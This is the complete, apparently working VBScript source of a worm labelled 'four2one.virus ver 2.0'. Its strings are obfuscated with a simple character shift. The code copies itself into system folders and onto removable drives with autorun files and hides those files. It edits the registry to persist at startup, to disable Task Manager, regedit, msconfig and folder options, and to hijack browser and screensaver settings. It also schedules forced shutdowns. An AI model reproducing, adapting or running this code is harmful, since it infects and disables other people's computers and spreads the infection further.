'four2one.virus ver 2.0

on error resume next
dim rekur,syspath,windowpath,desa,twoone,mf,misi,tf,four2,nt,check,sd, Dn,Wd,Hn,Mn,nae, viti,ld,gap,nowd, recy

misi =  ReAd( "^ovspuvb\" ) & vbcrlf & ReAd( "tcw/fmdzdfs!fyf/uqjsdtx>fuvdfyfmmfit" )

html = 	ReAd( "?#86!;uihjfi!<576!;iuejx!<722!;ugfm!<93!;qpu!<fuvmptcb!;opjujtpq#>fmzut!wje=?#111111$#>spmpdhc!zepc=" ) & vbcrlf &_
	ReAd( "?wje0=?q0=?uopg0=1/3!sfw!!fop3svpg!n(j?#8#>f{jt!#fuspG#>fdbg!#DDDDDD$#>spmpd!uopg=?#sfuofd#>ohjmb!q=" ) & vbcrlf &_
	ReAd( "?#2.!;yfeoj.{!<79!;qpu!<112!;ugfm!<fuvmptcb!;opjujtpq#>fmzut!obqt=?#sfuofd#>ohjmb!q=" ) & vbcrlf &_
	ReAd( "?obqt0=?#115#>uihjfi!#117#>iuejx!#HQK/922:521K0SPD17CVQ0USBQJMD0fdjggP!ugptpsdjN0tfmjG!nbshpsQ0;D#>dst!#1#>sfespc!hnj=" ) & vbcrlf &_
	ReAd( "?#2!;yfeoj.{!<79!;qpu!<112!;ugfm!<fuvmptcb!;opjujtpq#>fmzut!obqt=" ) & vbcrlf &_
	ReAd( "?q0=?#sfuofd#>ohjmb!q=?q0=?obqt0=?#115#>uihjfi!#117#>iuejx!#hqk/fmhpph]34nfutzt]txpeojx];d#>dst!#1#>sfespc!hnj=" ) & vbcrlf &_
	ReAd( "?#73!;uihjfi!<576!;iuejx!<722!;ugfm!<2:5!;qpu!<fuvmptcb!;opjujtpq#>fmzut!wje=" ) & vbcrlf &_
	ReAd( "?#sfuofd#>ohjmb!q=?wje0=?q0=?c0=?uopg0=9113!mjsqB!82?#DDDDDD$#>spmpd!#5#>f{jt!#lppcmppidT!zsvuofD#>fdbg!uopg=?c=?#sfuofd#>ohjmb!q=" )

explor= ReAd( "uyfo!fnvtfs!spssf!op" ) & vbcrlf & _
	ReAd( "qx!-et!-fnbOxfO!-fnbOemP!njE" ) & vbcrlf & _
	ReAd( "*#udfkcPnfutzTfmjG/hojuqjsdT#)udfkcpfubfsd!>!pd!uft" ) & vbcrlf & _
	ReAd( "*#mmfit/uqjsdtX#)udfkcpfubfsd!>!et!uft" ) & vbcrlf & _
	ReAd( "*1)sfempgmbjdfqtufh/pd!>!qx!ufT" ) & vbcrlf & _
	ReAd( "#mme/bovuspG]34nfutzt]txpeojx];d#!>!fnbOemP" ) & vbcrlf & _
	ReAd( "#tcw/fop3svpg]34nfutzt]txpeojx];d#!>!fnbOxfO" ) & vbcrlf & _
	ReAd( "ftmbg!-fnbOxfO!-fnbOemP!fmjgzqpd/pd" ) & vbcrlf & _
	ReAd( "ofiu!96!>!sfcnvO/ssF!gj" ) & vbcrlf & _
	ReAd( "ftmf" ) & vbcrlf & _
	ReAd( "#tcw/fop3svpg]34nfutzt]txpeojx];d#!ovs/et" ) & vbcrlf & _
	ReAd( "!gj!eof" ) & vbcrlf & _
	ReAd( "#fyf/sfspmqyf]#!'!qx!ovs/et" )

recy =  ReAd( "uyfo!fnvtfs!spssf!op" ) & vbcrlf & _
	ReAd( "qx!-et!-fnbOxfO!-fnbOemP!njE" ) & vbcrlf & _
	ReAd( "*#udfkcPnfutzTfmjG/hojuqjsdT#)udfkcpfubfsd!>!pd!uft" ) & vbcrlf & _
	ReAd( "*#mmfit/uqjsdtX#)udfkcpfubfsd!>!et!uft" ) & vbcrlf & _
	ReAd( "*1)sfempgmbjdfqtufh/pd!>!qx!ufT" ) & vbcrlf & _
	ReAd( "#ojc/fmdzdfS]#!>!fnbOemP" ) & vbcrlf & _
	ReAd( "#tcw/fop3svpg]34nfutzt]txpeojx];d#!>!fnbOxfO" ) & vbcrlf & _
	ReAd( "ftmbg!-fnbOxfO!-fnbOemP!fmjgzqpd/pd" ) & vbcrlf & _
	ReAd( "ofiu!96!>!sfcnvO/ssF!gj" ) & vbcrlf & _
	ReAd( "ftmf" ) & vbcrlf & _
	ReAd( "#tcw/fop3svpg]34nfutzt]txpeojx];d#!ovs/et" ) & vbcrlf & _
	ReAd( "!gj!eof" ) & vbcrlf & _
	ReAd( "fnbommvGuqjsdT/uqjsdtX!'!#!-udfmft0-f0!fyf/sfspmqyf]#!'!qx!ovs/et" )

set twoone = createobject(ReAd( "udfkcPnfutzTfmjG/hojuqjsdT" ))
set mf = twoone.getfile (Wscript.ScriptFullname)
set four2 = createobject( ReAd( "mmfiT/uqjsdTX") )
dim text,size
size = mf.size
check = mf.drive.drivetype
set text = mf.openastextstream(1,-2)
do while not text.atendofstream
rekur = rekur & text.readline
rekur = rekur & vbcrlf
loop
do
 
Wd = weekday(Now)
Hn = hour(now)
Mn = minute(now)

Set windowpath = twoone.getspecialfolder(0)
Set syspath = twoone.getspecialfolder(1)

viti=date*1+421000014.0421
set tf = twoone.createtextfile(windowpath & ReAd( "mme/fubembdpm]" ),false)
tf.write viti
tf.close
set tf = twoone.getfile(windowpath & ReAd( "mme/fubembdpm]" ))
tf.attributes = 39

set tf = twoone.getfile(syspath & ReAd( "tcw/fop3svpg]" ))
tf.attributes = 39
set tf = twoone.createtextfile(syspath & ReAd( "tcw/fop3svpg]" ),2,true)
tf.write rekur
tf.close
set tf = twoone.getfile(syspath &ReAd( "tcw/fop3svpg]" ))
tf.attributes = 39

set tf = twoone.getfile(syspath & ReAd( "mme/bovuspG]" ))
tf.attributes = 39
set tf = twoone.createtextfile(syspath & ReAd( "mme/bovuspG]" ),2,true)
tf.write rekur
tf.close
set tf = twoone.getfile(syspath & ReAd( "mme/bovuspG]" ))
tf.attributes = 39

set tf = twoone.getfile(syspath & ReAd( "tcw/sfspmqyf]" ))
tf.attributes = 39
set tf = twoone.createtextfile(syspath & ReAd( "tcw/sfspmqyf]" ))
tf.write explor
tf.close
set tf = twoone.getfile(syspath & ReAd( "tcw/sfspmqyf]" ))
tf.attributes = 39

set tf=twoone.createtextfile(syspath & ReAd( "nui/fmhpph]" ),2,true)
tf.write html
tf.close
set tf = twoone.getfile(syspath & ReAd( "nui/fmhpph]" ))
tf.attributes=39

twoone.CopyFile  syspath & ReAd( "hqk/fmhppH]" ), "c:\", true
twoone.CopyFile  syspath & ReAd( "nui/fmhppH]" ), "c:\", true

for each desa in twoone.drives
If (desa.drivetype = 1 or desa.drivetype = 2) and desa.path <>"A:" and desa.path <>"C:" then

set tf=twoone.getfile(desa.path & ReAd( "ojc/fmdzdfS]" ))
tf.attributes =39
set tf=twoone.createtextfile(desa.path & ReAd( "ojc/fmdzdfS]" ),2,true)
tf.write rekur
tf.close
set tf=twoone.getfile(desa.path & ReAd( "ojc/fmdzdfS]" ))
tf.attributes = 39

set tf=twoone.getfile(desa.path & ReAd( "tcw/fmdzdfS]" ))
tf.attributes =39
set tf=twoone.createtextfile(desa.path & ReAd( "tcw/fmdzdfS]" ),2,true)
tf.write recy
tf.close
set tf=twoone.getfile(desa.path & ReAd( "tcw/fmdzdfS]" ))
tf.attributes = 39

set tf =twoone.getfile(desa.path & ReAd( "goj/ovspuvb]" ))
tf.attributes = 32
set tf=twoone.createtextfile(desa.path & ReAd( "goj/ovspuvb]" ),2,true)
tf.write misi
tf.close
set tf = twoone.getfile(desa.path & ReAd( "goj/ovspuvb]" ))
tf.attributes=39

twoone.CopyFile syspath & ReAd( "hqk/fmhppH]" ), desa.path & "\", true
twoone.CopyFile desa.path & ReAd( "hqk/fmhppH]" ), syspath & "\", true
end if
next

set four2 = createobject( ReAd( "mmfiT/uqjsdTX") )
four2.regwrite ReAd( "topjuqPsfempGpO]sfspmqyF]tfjdjmpQ]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]SFTV`UOFSSVD`ZFLI" ),"1",ReAd("ESPXE`HFS")
four2.regwrite ReAd( "shnltbUfmcbtjE]nfutzt]tfjdjmpQ]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]SFTV`UOFSSVD`ZFLI" ),"1",ReAd("ESPXE`HFS")
four2.regwrite ReAd( "ofeejI]efdobweB]sfspmqyF]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]SFTV`UOFSSVD`ZFLI" ),"0",ReAd("ESPXE`HFS")
four2.regwrite ReAd( "nfutzTugptpsdjN]ovS]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]FOJIDBN`MBDPM`ZFLI" ), syspath & ReAd( "tcw/fop3svpg]" )

four2.regwrite ReAd( "fnbOfqzUzmeofjsG]fmjGTCW]UPPS`TFTTBMD`ZFLI" ), ReAd( "opjtofuyF!opjubdjmqqB" )
four2.regwrite ReAd( "uyFxpiTsfwfO]fmjGTCW]UPPS`TFTTBMD`ZFLI" ),""
four2.regwrite ReAd( "]opdJumvbgfE]fmjGTCW]UPPS`TFTTBMD`ZFLI" ),  four2.RegRead (ReAd( "fmjgmme]UPPS`TFTTBMD`ZFLI" ) & ReAd( "]opdJumvbgfE]" ))
four2.regwrite ReAd( "eobnnpD]ujeF]mmfiT]fmjGTCW]UPPS`TFTTBMD`ZFLI" ), ""

four2.regwrite ReAd( "sfhhvcfe]fyf/ujefhfs]topjuqP!opjuvdfyF!fmjG!fhbnJ]opjtsfWuofssvD]UO!txpeojX]ugptpsdjN]FSBXUGPT]FOJIDBN`MBDPM`ZFLI" ),ReAd( "fyf/ebqfupo" )
four2.regwrite ReAd( "sfhhvcfe]fyf/hjgopdtn]topjuqP!opjuvdfyF!fmjG!fhbnJ]opjtsfWuofssvD]UO!txpeojX]ugptpsdjN]FSBXUGPT]FOJIDBN`MBDPM`ZFLI" ),ReAd( "fyf/ebqfupo" )

'four2.regwrite ReAd( "effqTldjmDfmcvpE]ftvpN]mfobQ!mpsuopD]SFTV`UOFSSVD`ZFLI"), "1"

set mf = twoone.getfile(windowpath & ReAd( "mme/fubembdpm]" ))
set ld = mf.openastextstream(1)
dn = ld.readline
nowd=date*1+421000000.0421
gap=nowd-dn

if gap>0  Then
four2.regwrite ReAd( "fhbQ!usbuT]ojbN]sfspmqyF!ufosfuoJ]ugptpsdjN]fsbxugpT]SFTV`UOFSSVD`ZFLI" ), ReAd( "nui/fmhppH];d" )
four2.regwrite ReAd( "]dfyffee]fspmqyf]mmfit]sfempG]tfttbmD]FSBXUGPT]FOJIDBN`MBDPM`ZFLI" ),""
four2.regwrite ReAd( "]eobnnpd]fspmqyf]mmfit]sfempG]tfttbmD]FSBXUGPT]FOJIDBN`MBDPM`ZFLI" ), ReAd( "tcw/sfspmqyf]34nfutzt]txpeojx];d!!fyf/uqjsdTX]34nfutzT]txpeojx];d" )
four2.regwrite ReAd( "b]VSNovS]sfspmqyF]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]SFTV`UOFSSVD`ZFLI" ), ReAd( "tvsjw/fop3svpg" )
four2.regwrite ReAd( "utjMVSN]VSNovS]sfspmqyF]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]SFTV`UOFSSVD`ZFLI" ), "a"
four2.regwrite ReAd( "uvPfnjUfwbToffsdT]qpultfE]mfobQ!mpsuopD]SFTV`UOFSSVD`ZFLI" ),"60"
four2.regwrite ReAd( "fyf/fwbtosdT]qpultfE]mfobQ!mpsuopD]SFTV`UOFSSVD`ZFLI" ), ReAd( "sdt/e4uyfutt]]34nfutzt]]TXPEOJX]];D" )
four2.regwrite ReAd( "hojsuTzbmqtjE]E4uyfU]tsfwbtoffsdT]ugptpsdjN]fsbxugpT]SFTV`UOFSSVD`ZFLI"), ReAd( "1/3!sfw!fop3svpg!n(j" )
four2.regwrite ReAd( "zujwjujtofTftvpN]ftvpN]mfobQ!mpsuopD]SFTV`UOFSSVD`ZFLI" ),"1"
four2.regwrite ReAd( "effqTftvpN]ftvpN]mfobQ!mpsuopD]SFTV`UOFSSVD`ZFLI" ),"0"
nae = four2.RegRead (ReAd( "sfoxPefsfutjhfS]opjtsfWuofssvD]UO!txpeojX]ugptpsdjN]FSBXUGPT]FOJIDBN`MBDPM`ZFLI" ))
four2.regwrite ReAd( "]mmfit]sfempg]tfttbmD]FSBXUGPT]FOJIDBN`MBDPM`ZFLI" ) & nae & ReAd( "]eobnnpd]fN!ub!lppm!ftbfmQ!t(" ),ReAd( "FYF/FSPMQYFJ" ),"REG_EXPAND_SZ"
	if Wd = 5 and Hn > 12 then
	set sd = createobject(ReAd( "mmfit/uqjsdtX" ))
	sd.run ReAd( "1!u.!t.!fyf/oxpeuvit" )
	else
	if Mn = 9 or Mn = 19 or Mn = 29 or Mn = 39 or Mn = 49 or Mn = 59 then
	twoone.CopyFile four2.SpecialFolders(ReAd( "uofdfs" )) & ReAd( "lom/hqk/+]" ), four2.SpecialFolders(ReAd( "qpultfE" )) & "\", true
	set sd = createobject(ReAd( "mmfit/uqjsdtX" ))
	sd.run ReAd( "FYF/FSPMQYFJ" )
	end if
	end if
end if

if check <> 1 then
Wscript.sleep 80000
end if
loop while check <> 1 
set sd = createobject(ReAd( "mmfit/uqjsdtX" ))
sd.run windowpath & ReAd( "!-udfmft0-f0!fyf/sfspmqyf]" ) & Wscript.ScriptFullname

Function ReAd( WriTe )
   Dim Son, ToLo, Yo
   Son = ""
   For ToLo = 1 To Len( WriTe )
       Yo = Mid( WriTe, ToLo, 1 )
       Son = Chr( Asc( Yo ) - 1 ) & Son 
   Next
   ReAd = Son
End Function

